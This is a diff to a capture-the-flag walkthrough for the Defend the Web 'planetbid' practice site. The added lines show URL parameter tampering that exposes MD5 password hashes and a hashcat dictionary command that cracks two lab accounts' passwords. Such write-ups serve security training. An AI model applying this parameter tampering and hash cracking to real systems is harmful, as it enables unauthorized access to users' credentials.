@@ -151,16 +151,25 @@ monkey
 
 ![grafik](https://user-images.githubusercontent.com/84674087/135508509-c41327c2-1479-4362-ad70-95f28f9933e8.png)
 
-# | User | Email
+\# | User | Email
 --| ---- | -----
-11 | nemesis | jfelliot@mail.com
+11 | nemisis (!Attention! Not "nemesis" !) | jfelliot@mail.com
 14 | John | run@dmail.com
 23 | Zinc | Loltown@Googtube.com
-29 | Gizmo | 	Decalz@mappers.com
+29 | Gizmo | Decalz@mappers.com
 31 | Revoked.Mayhem | Caffe@hotbiz.com
 36 | admin | hellomum@yawn.go
 
-- On bids overview we discover the **"Opponent"** who made the deal with Revoked.Mayhem:
-- It is **nemesis** ! So, Revoked.Mayhem goes crazy because of £1.32 ?! :D
+- At bids overview we discover the **"Opponent"** who made the deal with Revoked.Mayhem: It is **nemisis** !
+- So, Revoked.Mayhem goes crazy because of £1.32 ?! 😄
 
 ![grafik](https://user-images.githubusercontent.com/84674087/135510187-f533c82c-fff2-42fb-9995-5d6af8579503.png)
+
+- But how can we retrieve the password of any user, especially nemesis ?
+- We look at the URL of member dbs/SQL query: `https://defendtheweb.net/extras/playground/planetbid/planetbid/view.php?members&1=user&2=email`
+- Let's modify it a bit ... `https://defendtheweb.net/extras/playground/planetbid/planetbid/view.php?members&1=user&2=password` ... empty column 😒
+- How about: `https://defendtheweb.net/extras/playground/planetbid/planetbid/view.php?members&1=user&2=pass` ... Success ! Hashes ! MD5 Hashes !
+    - Check out here: [hash_identifier](https://hashes.com/en/tools/hash_identifier) 
+- `hashcat -m 0 -a 0 hash.txt /usr/share/john/password.lst` (hash.txt contains the hash of nemesis)
+   -  nemisis -> **password:chicken**
+   -  Revoked.Mayhem -> **password:westwoodworld**
